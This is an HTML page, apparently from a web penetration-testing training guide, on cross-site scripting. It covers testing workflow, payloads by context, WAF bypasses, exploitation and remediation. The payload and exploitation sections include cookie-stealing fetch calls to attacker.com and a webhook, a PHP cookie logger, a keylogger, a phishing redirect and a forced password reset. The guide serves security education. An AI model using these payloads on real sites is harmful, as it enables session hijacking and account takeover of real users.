@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cross-Site Scripting (XSS) testing guide: reflected, stored, and DOM XSS. Payloads, bypass techniques, and PortSwigger lab links.">
+    <meta property="og:title" content="Cross-Site Scripting (XSS) – Web App Pentesting Guide">
+    <meta property="og:description" content="Cross-Site Scripting (XSS) testing guide: reflected, stored, and DOM XSS. Payloads, bypass techniques, and PortSwigger lab links.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Cross-Site Scripting (XSS)  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Cross-Site Scripting</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 6.1 · Day 5</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></span><span>Cross-Site Scripting (XSS)</span></h1>
+      <p>Inject malicious JavaScript into web pages to steal cookies, hijack sessions, or redirect users.</p>
+      <div class="badge-row">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Beginner-Intermediate</span>
+      </div>
+    </div>
+
+    <!-- ═══ ANALOGY ═══ -->
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">Community Notice Board</div>
+        <p>Imagine a community notice board where anyone can post messages. A malicious person posts a note that looks normal, but includes a hidden instruction: "When you read this, send me your house keys." Everyone who reads the note subconsciously follows the instruction and mails their keys. XSS works the same way: an attacker posts JavaScript into a web page. Visitors' browsers execute the script, unwittingly stealing their session cookies or signing them up for scams.</p>
+      </div>
+    </section>
+
+    <!-- ═══ METHODOLOGY ═══ -->
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill probe"><span class="day-num">Day 2</span>Initial Probe</div>
+      <div class="day-pill"><span class="day-num">Day 3</span>Stored / DOM</div>
+      <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+      <div class="day-pill deep"><span class="day-num">Day 5</span>Deep Dive</div>
+    </div>
+
+    <div class="callout method-probe">
+      <div class="callout-title">⚡ Day 2  · Initial Probe</div>
+      <p>On Day 2, inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> into every reflected input. You're just looking for reflection  · does the string appear in the response body? In an attribute? In a JavaScript string? Mark it and move on. Also check stored fields (comments, profile bio)  · just submit the canary string <code>xyz_xss_test</code> and note which pages render it.</p>
+      <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;    → reflected in HTML body?
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;  → breaks out of attribute?
+xyz_xss_test                   → canary for stored XSS detection</code></pre>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 5  · Deep Dive (Full Exploitation)</div>
+      <p>Return to every reflected/stored XSS signal from Day 2. Identify the injection context (HTML body, attribute, JS string, href). Adapt your payload. For DOM XSS: use Burp DOM Invader  · enable it in the Burp browser and look for sources flowing into dangerous sinks. Test stored XSS by injecting into every persistent field and visiting the pages where data is rendered.</p>
+      <pre><code>// Session theft  · send to your webhook
+&lt;img src=x onerror="fetch('https://YOUR.webhook.site/'+document.cookie)"&gt;
+
+// BSCP pattern: inject into stored field → admin views it → steal admin session</code></pre>
+      <p><strong>Chain it:</strong> Stored XSS → steal admin session cookie → IDOR as admin → full account takeover. Or: XSS → CSRF bypass (inject form submission) → change victim's email/password.</p>
+    </div>
+
+    <!-- ═══ HOW IT WORKS ═══ -->
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>XSS occurs when an application includes untrusted user input in a response without proper encoding or sanitization. The browser interprets the input as code, not text, and executes it with the victim's privileges.</p>
+
+      <h3>The Three Types of XSS</h3>
+      <ul>
+        <li><strong>Reflected:</strong> Attacker-controlled input is immediately reflected in the response (URL parameter, search term)</li>
+        <li><strong>Stored:</strong> Malicious input is saved to the database and executed for every user who views it (comments, profile bios, posts)</li>
+        <li><strong>DOM-based:</strong> Vulnerable JavaScript code processes user input unsafely, modifying the DOM and executing scripts</li>
+      </ul>
+
+      <h3>Example  · Vulnerable Code</h3>
+      <pre><code>// Reflected XSS  · PHP
+&lt;?php
+  $name = $_GET['name'];
+  echo "Welcome, " . $name . "!";
+?&gt;</code></pre>
+
+      <p>If you visit <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>, the page renders:</p>
+      <pre><code>Welcome, &lt;script&gt;alert(1)&lt;/script&gt;!</code></pre>
+
+      <p>The browser executes the script. The attacker crafts a phishing email: "Click here to see your account" → link is <code>http://site.com/?name=&lt;script&gt;stealCookie()&lt;/script&gt;</code>.</p>
+
+      <h3>Why It's Dangerous</h3>
+      <ul>
+        <li>Steal session cookies and hijack user accounts</li>
+        <li>Perform actions on behalf of the victim (transfer funds, change passwords, post content)</li>
+        <li>Install malware or redirect to phishing sites</li>
+        <li>Deface the website for all users</li>
+        <li>Capture keystrokes or form data</li>
+        <li>Spread malicious content or worms across social networks</li>
+      </ul>
+    </section>
+
+    <!-- ═══ WHERE TO LOOK ═══ -->
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>XSS hides in any place where user input is displayed back to users. Test all input fields and URL parameters:</p>
+
+      <h3>Common Injection Points</h3>
+      <ul>
+        <li><strong>Search Boxes:</strong> Product search, user search, content filtering</li>
+        <li><strong>Comments & Reviews:</strong> Comment sections, product reviews, forum posts</li>
+        <li><strong>Profile Fields:</strong> Username, bio, profile picture URL, about me</li>
+        <li><strong>Form Fields:</strong> Contact forms, feedback, bug reports</li>
+        <li><strong>URL Parameters:</strong> ?search=, ?message=, ?redirect=, ?email=</li>
+        <li><strong>Email & Messages:</strong> Stored in user inboxes, rendered in email clients or web interfaces</li>
+      </ul>
+
+      <h3>Vulnerable JavaScript Sinks (DOM-based)</h3>
+      <p>Look at the page source for dangerous patterns that process user input:</p>
+      <ul>
+        <li><code>document.getElementById('x').innerHTML = userInput</code>  · Direct DOM assignment</li>
+        <li><code>document.location = userInput</code>  · Redirect with user input</li>
+        <li><code>eval(userInput)</code>  · Execute user input as code</li>
+        <li><code>setTimeout(userInput, 1000)</code>  · Scheduled execution</li>
+        <li><code>window.postMessage(userInput)</code>  · Cross-frame messaging with untrusted data</li>
+        <li><code>document.write(userInput)</code>  · Write directly to DOM</li>
+      </ul>
+
+      <h3>How User Input Reaches These Sinks</h3>
+      <ul>
+        <li><code>document.location.hash</code>  · <code>#fragment</code> in the URL</li>
+        <li><code>document.URL</code>  · Full page URL including query string</li>
+        <li><code>window.name</code>  · Window name property</li>
+        <li><code>document.referrer</code>  · HTTP Referer header</li>
+        <li><code>localStorage</code> / <code>sessionStorage</code>  · Client-side storage</li>
+      </ul>
+    </section>
+
+    <!-- ═══ BURP WORKFLOW ═══ -->
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Identify Input Points</strong>
+          <p>Use Burp Proxy to browse the application and identify where user input is displayed. Look for search boxes, comment sections, error messages, and profile pages. Make a note of each parameter.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Test Reflected XSS</strong>
+          <p>In Burp Repeater, inject a simple payload: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> into a GET parameter. Check the response  · is your payload visible in the HTML? Does it appear in a <code>&lt;script&gt;</code> tag, in an HTML attribute, or in plain text?</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Identify Context</strong>
+          <p>The context (where your payload appears) determines the attack vector. Is it inside an HTML tag attribute? Inside a JavaScript string? In a URL? This affects which payload syntax works.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Craft Context-Specific Payload</strong>
+          <p>If the payload appears inside a double-quoted attribute, use: <code>" onmouseover="alert(1)</code>. If inside a script tag, use: <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>. Test encoding variations if blocked.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Test Stored XSS</strong>
+          <p>Inject payloads into fields that are saved to the database (comments, profile bio). Submit the form. Log out and log back in. Does the payload execute? Check if other users see the payload.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Detect DOM-based XSS with DOM Invader</strong>
+          <p>Use Burp's DOM Invader (available in Burp Community). It automatically identifies sources and sinks in JavaScript. Test payloads like <code>test'&gt;&lt;img src=x onerror=alert(1)&gt;</code> to trigger DOM XSS.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOADS & TECHNIQUES ═══ -->
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>HTML Body Context</h3>
+      <p>Your payload appears in plain HTML. Use standard script tags:</p>
+      <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;</code></pre>
+
+      <h3>HTML Attribute Context (Double-Quoted)</h3>
+      <p>Your payload appears inside an attribute, e.g., <code>&lt;img title="USER_INPUT"&gt;</code>:</p>
+      <pre><code>" onmouseover="alert(1)
+" onclick="alert(1)
+" autofocus onfocus="alert(1)
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src="</code></pre>
+
+      <h3>HTML Attribute Context (Single-Quoted)</h3>
+      <p>Same idea, but with single quotes:</p>
+      <pre><code>' onmouseover='alert(1)
+' onclick='alert(1)
+'&gt;&lt;img src='x' onerror='alert(1)&gt;</code></pre>
+
+      <h3>JavaScript String Context</h3>
+      <p>Your payload appears inside a JavaScript string, e.g., <code>&lt;script&gt;var name = "USER_INPUT"&lt;/script&gt;</code>:</p>
+      <pre><code>";alert(1);//
+";alert(String.fromCharCode(88,83,83));//
+\";alert(1);//
+' + alert(1) + '
+</code></pre>
+
+      <h3>JavaScript URL Context (href, src)</h3>
+      <p>Attribute contains a URL that executes JavaScript:</p>
+      <pre><code>javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:void(fetch('http://attacker.com/?c='+document.cookie))
+data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+      <h3>SVG & Namespace Bypasses</h3>
+      <p>SVG elements allow event handlers outside traditional HTML:</p>
+      <pre><code>&lt;svg/onload=alert(1)&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;
+&lt;math&gt;&lt;mi//xlink:href="data:x,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></pre>
+
+      <h3>Event Handler Payloads</h3>
+      <pre><code>onload
+onerror
+onclick
+onmouseover
+onmouseenter
+onkeydown
+onkeyup
+oninput
+onchange
+onsubmit
+onfocus
+onblur
+ondblclick
+onwheel
+ontouchstart</code></pre>
+
+      <h3>Cookie Theft Payload</h3>
+      <p>Basic example to send cookies to an attacker-controlled server:</p>
+      <pre><code>&lt;script&gt;
+  fetch('http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie));
+&lt;/script&gt;
+
+// Or using an image request (works even if fetch is blocked):
+&lt;img src=x onerror="new Image().src='http://attacker.com/?c='+document.cookie"&gt;</code></pre>
+
+      <h3>Filter Bypass with Encoding</h3>
+      <p>If basic payloads are blocked, try variations:</p>
+      <pre><code>// Case mixing
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+
+// Spaces (URL encoding, newlines)
+&lt;img%20src=x%20onerror=alert(1)&gt;
+&lt;img
+src=x
+onerror=alert(1)&gt;
+
+// HTML entities
+&lt;img src=x onerror=&quot;alert(1)&quot;&gt;
+&lt;img src=x onerror=&#x61;lert(1)&gt;
+
+// Breaking out with backticks
+&lt;img src=x onerror=`alert(1)`&gt;
+
+// Using String.fromCharCode to avoid quotes
+&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;</code></pre>
+
+      <h3>DOM-based XSS Payloads</h3>
+      <p>Target vulnerable JavaScript that processes user input without sanitization:</p>
+      <pre><code>// If JavaScript does: var user = location.hash.substring(1); elem.innerHTML = user
+#&lt;img src=x onerror=alert(1)&gt;
+
+// If using eval():
+#');alert(1);//
+
+// Breaking out of a function call:
+#'});alert(1);//</code></pre>
+
+      <h3>Polyglot Payload (Works in Multiple Contexts)</h3>
+      <pre><code>javascript:/*--&gt;&lt;/script&gt;&lt;svg onload=/**/onerror=alert(1)//</code></pre>
+    </section>
+
+    <!-- ═══ CHECKLIST ═══ -->
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <strong>XSS Test Cases</strong>
+          <span class="progress-mini">0/11</span>
+        </div>
+        <div class="progress-bar-wrap"><div class="progress-bar" style="width: 0%"></div></div>
+
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test all GET parameters with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> for reflected XSS</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test all POST parameters (form fields) with XSS payloads</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test stored input fields (comments, profile, bio) and verify execution persists across page reloads</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test for DOM-based XSS by injecting into URL fragments (#anchor) and observing JavaScript behavior</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test HTML attribute context payloads if input appears in an attribute value (e.g., title, placeholder)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test JavaScript string context by breaking quotes with <code>";alert(1);//</code></label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test javascript: protocol in href attributes</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test SVG and event handlers (onload, onerror) for namespace bypasses</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test encoding bypasses (HTML entities, URL encoding, case mixing) if basic payloads are blocked</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test second-order XSS by injecting in one field (admin note field) and viewing it in another context</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Confirm with proof-of-concept: steal session cookie and print it to page or send to external server</label>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ WAF BYPASS ═══ -->
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Case Mixing</h3>
+      <p>WAFs checking for exact strings miss case variations:</p>
+      <pre><code>&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;IMG SRC=x OnErRoR=alert(1)&gt;
+&lt;Svg OnLoad=alert(1)&gt;</code></pre>
+
+      <h3>Null Bytes & Special Characters</h3>
+      <pre><code>&lt;script%00&gt;alert(1)&lt;/script&gt;
+&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;
+&lt;scri&#x0;pt&gt;alert(1)&lt;/script&gt;</code></pre>
+
+      <h3>HTML Encoding in Attributes</h3>
+      <p>Use HTML entities for attribute values:</p>
+      <pre><code>&lt;img src=x onerror="&#x61;lert(1)"&gt;
+&lt;img src=x onerror="&#97;lert(1)"&gt;
+&lt;img src=x onerror="&quot;alert(1)&quot;"&gt;</code></pre>
+
+      <h3>Spaces and Newlines</h3>
+      <pre><code>&lt;img src=x onerror=alert(1)&gt;       (no quotes)
+&lt;img  src=x  onerror=alert(1)&gt;     (multiple spaces)
+&lt;img
+src=x
+onerror=alert(1)&gt;                    (newlines)</code></pre>
+
+      <h3>JavaScript URL Encoding</h3>
+      <pre><code>javascript:alert(String.fromCharCode(88,83,83))   (XSS in character codes)
+javascript:eval(atob('YWxlcnQoMSk='))             (Base64 decode)</code></pre>
+
+      <h3>Breaking Out with Uncommon Tags</h3>
+      <p>WAFs often whitelist common tags but miss others:</p>
+      <pre><code>&lt;details open ontoggle=alert(1)&gt;
+&lt;meter onmouseover=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;keygen onfocus=alert(1)&gt;
+&lt;isindex type=image src=x onerror=alert(1)&gt;</code></pre>
+
+      <h3>Event Handler Tricks</h3>
+      <p>Bypass filters checking for common events:</p>
+      <pre><code>&lt;img src=x onerror=&#x61;lert(1)&gt;           (&#x61; = 'a')
+&lt;svg onload="setTimeout(alert,1)"&gt;           (delay execution)
+&lt;svg onload="eval(name)"&gt;                      (uses window.name)
+&lt;img src=x onerror="window['ale'+'rt'](1)"&gt;  (string concatenation)</code></pre>
+
+      <h3>Data URLs</h3>
+      <pre><code>&lt;img src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/object&gt;</code></pre>
+
+      <h3>Comment-Based Bypasses</h3>
+      <pre><code>&lt;img src=x /*onerror*/=alert(1)&gt;
+&lt;img src=x o/**/nerror=alert(1)&gt;
+&lt;img src=x onerror/**/=alert(1)&gt;</code></pre>
+    </section>
+
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Session Hijacking Flow</h3>
+      <p>Basic attack to steal a user's session cookie:</p>
+
+      <pre><code>// Step 1: Set up attacker server to receive cookies
+// http://attacker.com/log_cookie.php
+&lt;?php file_put_contents('cookies.txt', $_GET['c'] . "\n", FILE_APPEND); ?&gt;
+
+// Step 2: Craft XSS payload
+&lt;script&gt;
+  fetch('http://attacker.com/log_cookie.php?c=' + encodeURIComponent(document.cookie));
+&lt;/script&gt;
+
+// Step 3: Deliver payload via URL or stored XSS
+// Phishing email: "Click here to verify your account: http://target.com/?msg=&lt;script&gt;fetch('http://attacker.com/log_cookie.php?c='+document.cookie)&lt;/script&gt;"
+
+// Step 4: Use stolen cookie
+// Copy-paste the cookie into a browser's dev tools (Application > Cookies) or use curl:
+// curl -H "Cookie: PHPSESSID=abcd1234..." http://target.com/account</code></pre>
+
+      <h3>Account Takeover via Password Reset</h3>
+      <pre><code>// Hijack the password reset form
+&lt;script&gt;
+  fetch('http://target.com/api/reset-password', {
+    method: 'POST',
+    body: JSON.stringify({
+      email: 'victim@example.com',
+      new_password: 'attacker_controlled_password'
+    })
+  });
+&lt;/script&gt;</code></pre>
+
+      <h3>Keylogging</h3>
+      <pre><code>&lt;script&gt;
+  document.addEventListener('keydown', (e) => {
+    fetch('http://attacker.com/log?key=' + e.key);
+  });
+&lt;/script&gt;</code></pre>
+
+      <h3>Redirection to Phishing Site</h3>
+      <pre><code>&lt;script&gt;
+  window.location = 'http://attacker.com/fake-login.html';
+&lt;/script&gt;</code></pre>
+
+      <h3>Real-World Exploitation Scenarios</h3>
+
+      <div class="finding-card">
+        <h4>Scenario 1: Stored XSS in Blog Comments</h4>
+        <p>Attacker posts a comment with JavaScript. Every time a user visits the blog, the script executes and steals their session cookie. The attacker now has access to thousands of user accounts.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 2: Reflected XSS in Search</h4>
+        <p>Attacker crafts a malicious link: <code>site.com/?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>. Sends it in a phishing email. When a victim clicks, their cookie is stolen.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 3: DOM-based XSS via URL Fragment</h4>
+        <p>A single-page application processes the URL fragment unsafely. Attacker sends: <code>site.com/#user=&lt;img src=x onerror=steal_cookie()&gt;</code>. The JavaScript code renders the fragment without sanitizing, triggering the XSS.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 4: Worm Propagation on Social Media</h4>
+        <p>Attacker injects JavaScript into a post/comment that automatically likes/shares the same payload. It spreads exponentially across the social network, infecting thousands of users.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 5: Supply Chain Attack via XSS in Admin Panel</h4>
+        <p>Admin panel has stored XSS in error logs. Attacker logs in with stolen credentials, posts JavaScript in error messages. When admins view logs, their session is hijacked and data is exfiltrated.</p>
+      </div>
+    </section>
+
+    <!-- ═══ REMEDIATION ═══ -->
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>Output Encoding (Context-Specific)</h3>
+      <p>Encode user output based on where it appears. Different contexts require different encoding:</p>
+
+      <h4>HTML Body Context (Encode &lt;, &gt;, &amp;, ", ')</h4>
+      <pre><code>// Python (Flask)
+from markupsafe import escape
+@app.route('/')
+def index():
+    user_input = request.args.get('name', '')
+    return f"Welcome, {escape(user_input)}!"
+
+// HTML entities: &lt;, &gt;, &amp;, &quot;, &#x27;</code></pre>
+
+      <h4>HTML Attribute Context (Encode all non-alphanumeric)</h4>
+      <pre><code>// PHP
+$safe_input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
+echo "&lt;img title='{$safe_input}'&gt;";</code></pre>
+
+      <h4>JavaScript String Context (Escape Quotes & Backslashes)</h4>
+      <pre><code>// JavaScript
+function escapeJsString(str) {
+  return str.replace(/\\/g, '\\\\')
+            .replace(/"/g, '\\"')
+            .replace(/'/g, "\\'")
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r');
+}
+
+var userInput = escapeJsString(userInput);
+var script = "var name = '" + userInput + "';";
+document.body.appendChild(document.createElement('script')).text = script;</code></pre>
+
+      <h4>URL Attribute Context (URL Encode)</h4>
+      <pre><code>// Python
+from urllib.parse import quote
+safe_url = quote(user_input, safe='')
+html = f'&lt;a href="{safe_url}"&gt;Link&lt;/a&gt;'</code></pre>
+
+      <h3>Content Security Policy (CSP)</h3>
+      <p>Enforce a strict policy limiting which resources can execute:</p>
+      <pre><code>// Strict policy  · no inline scripts, only from same origin
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+
+// Allow only specific domains
+Content-Security-Policy: script-src 'self' https://cdn.example.com;
+
+// Report violations without blocking (for testing)
+Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report</code></pre>
+
+      <h3>DOM Sanitization Libraries</h3>
+      <p>For client-side rendering, use libraries that remove dangerous content:</p>
+      <pre><code>// JavaScript (DOMPurify)
+&lt;script src="https://cdn.jsdelivr.net/npm/dompurify@latest/dist/purify.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+  var dirty = '&lt;img src=x onerror=alert(1)&gt;';
+  var clean = DOMPurify.sanitize(dirty);
+  document.body.innerHTML = clean;  // Safe
+&lt;/script&gt;
+
+// Python (bleach)
+import bleach
+dirty_html = '&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;Hello&lt;/p&gt;'
+clean_html = bleach.clean(dirty_html, tags=['p'], strip=True)</code></pre>
+
+      <h3>Avoid Dangerous APIs</h3>
+      <p>Never use these in client-side code with user input:</p>
+      <pre><code>// NEVER do this:
+document.getElementById('x').innerHTML = userInput;   // VULNERABLE
+eval(userInput);                                        // VULNERABLE
+setTimeout(userInput, 1000);                            // VULNERABLE
+document.location = userInput;                          // VULNERABLE
+
+// Use these instead:
+document.getElementById('x').textContent = userInput;   // SAFE (no HTML parsing)
+document.getElementById('x').appendChild(
+  document.createTextNode(userInput)
+);                                                      // SAFE</code></pre>
+
+      <h3>HTTP Security Headers</h3>
+      <pre><code>// Prevent clickjacking
+X-Frame-Options: DENY
+
+// Prevent MIME sniffing
+X-Content-Type-Options: nosniff
+
+// Enable XSS filter in older browsers
+X-XSS-Protection: 1; mode=block</code></pre>
+
+      <h3>Security Testing</h3>
+      <ul>
+        <li>Include XSS testing in your CI/CD with automated tools (Burp Scanner, OWASP ZAP)</li>
+        <li>Use Static Application Security Testing (SAST) tools to find dangerous patterns (unsanitized echo, innerHTML assignment)</li>
+        <li>Perform code reviews focusing on input/output handling</li>
+      </ul>
+    </section>
+
+    <!-- ═══ PORTSWIGGER LABS ═══ -->
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>PortSwigger Academy provides 20+ XSS labs covering all three types and various contexts:</p>
+
+      <h3>Apprentice (Beginner)</h3>
+      <ul>
+        <li><strong>Reflected XSS into HTML context:</strong> Inject script tag into search parameter</li>
+        <li><strong>Reflected XSS into HTML context with most tags and attributes blocked:</strong> Use alternate tags (img, svg) and events</li>
+        <li><strong>Reflected XSS with some SVG markup allowed:</strong> Exploit SVG namespace</li>
+        <li><strong>Reflected XSS in attributes:</strong> Break out of attribute with quotes, use event handler</li>
+        <li><strong>Stored XSS into HTML context:</strong> Post comment with JavaScript, verify it executes for other users</li>
+      </ul>
+
+      <h3>Practitioner (Intermediate)</h3>
+      <ul>
+        <li><strong>Stored XSS in HTML context with limited input sanitization:</strong> Bypass basic filters</li>
+        <li><strong>Reflected XSS into a JavaScript string context:</strong> Break quotes, inject alert()</li>
+        <li><strong>Reflected XSS into a JavaScript context with angle brackets and double quotes HTML-encoded:</strong> Use String.fromCharCode or backticks</li>
+        <li><strong>Stored XSS in Markdown with HTML sanitization:</strong> Exploit markdown rendering</li>
+        <li><strong>DOM-based XSS in jQuery:</strong> Exploit unsafe jQuery methods (html(), append())</li>
+        <li><strong>DOM-based XSS via postMessage:</strong> Exploit cross-frame messaging</li>
+        <li><strong>Reflected XSS in a JSON response with HTML-escaped data:</strong> Escape HTML encoding, execute JavaScript</li>
+      </ul>
+
+      <h3>Expert (Advanced)</h3>
+      <ul>
+        <li><strong>Stored XSS with NoSQL injection:</strong> Combine two vulnerabilities</li>
+        <li><strong>Reflected XSS with Unicode escaping:</strong> Use Unicode encoding to bypass filters</li>
+        <li><strong>DOM-based XSS with filter evasion:</strong> Complex source-to-sink analysis</li>
+        <li><strong>XSS with WAF bypass:</strong> Case mixing, encoding tricks, uncommon tags</li>
+        <li><strong>Second-order XSS with DOM manipulation:</strong> Inject in one place, execute in another after DOM processing</li>
+      </ul>
+    </section>
+
